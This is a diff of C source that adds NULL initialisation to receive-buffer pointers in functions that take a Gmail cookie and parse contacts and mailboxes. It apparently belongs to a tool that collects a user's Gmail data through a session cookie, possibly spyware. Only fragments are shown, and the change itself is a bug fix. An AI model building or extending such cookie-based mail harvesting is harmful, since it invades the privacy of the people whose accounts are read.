@@ -15,7 +15,7 @@
 DWORD GMailParseContacts(LPSTR strCookie, LPSTR strIKValue, LPWSTR strUserName)
 {
 	LPWSTR strURI;
-	LPSTR strRecvBuffer;
+	LPSTR strRecvBuffer = NULL;
 	DWORD dwRet, dwBufferSize;
 
 	strURI = (LPWSTR) zalloc(1024*sizeof(WCHAR));
@@ -127,7 +127,7 @@ DWORD GMailGetIK(LPSTR strCookie, LPSTR *strIKValue, LPWSTR *strCurrentUserName)
 	*strCurrentUserName = NULL;
 
 	LPWSTR strURI;
-	LPSTR strRecvBuffer;
+	LPSTR strRecvBuffer = NULL;
 	DWORD dwRet, dwBufferSize;
 
 	strURI = (LPWSTR) zalloc(1024*sizeof(WCHAR));
@@ -181,7 +181,7 @@ DWORD GMailContactHandler(LPSTR strCookie)
 DWORD GMailParseMailBox(LPWSTR strMailBoxName, LPSTR strCookie, LPSTR strIKValue, DWORD dwLastTSHigh, DWORD dwLastTS, BOOL bIncoming, BOOL bDraft)
 {
 	LPWSTR strURI;
-	LPSTR strRecvBuffer;
+	LPSTR strRecvBuffer = NULL;
 	DWORD dwRet, dwBufferSize;
 
 	strURI = (LPWSTR) zalloc(1024*sizeof(WCHAR));
@@ -223,7 +223,7 @@ DWORD GMailParseMailBox(LPWSTR strMailBoxName, LPSTR strCookie, LPSTR strIKValue
 		SocialSetLastTimestamp(strIKValue, dwCurrTS, dwCurrTSHigh);
 
 		
-		LPSTR strRecvBuffer2;
+		LPSTR strRecvBuffer2 = NULL;
 		DWORD dwBufferSize2;
 
 		strURI = (LPWSTR) zalloc(1024*sizeof(WCHAR));
